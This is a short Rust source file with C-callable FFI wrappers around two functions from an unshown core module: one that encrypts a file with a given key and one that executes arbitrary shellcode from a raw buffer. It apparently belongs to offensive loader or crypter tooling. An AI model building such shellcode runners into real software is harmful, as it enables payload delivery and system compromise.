use std::ffi::CStr;
use std::os::raw::c_char;
use std::slice;
use std::ptr;
use crate::core::{encrypt_file, execute_shellcode};

#[no_mangle]
pub unsafe extern "C" fn rust_encrypt_file(input_path: *const c_char, output_path: *const c_char, key: *const c_char) {
    let input_path = CStr::from_ptr(input_path).to_str().unwrap();
    let output_path = CStr::from_ptr(output_path).to_str().unwrap();
    let key = CStr::from_ptr(key).to_bytes();

    let result = encrypt_file(input_path.into(), output_path.into(), key);
    if let Err(e) = result {
        eprintln!("Encryption failed: {:?}", e);
    }
}

#[no_mangle]
pub unsafe extern "C" fn rust_execute_shellcode(shellcode: *const u8, shellcode_size: usize) {
    let shellcode = slice::from_raw_parts(shellcode, shellcode_size);

    if let Err(e) = execute_shellcode(shellcode) {
        eprintln!("Shellcode execution failed: {:?}", e);
    }
}
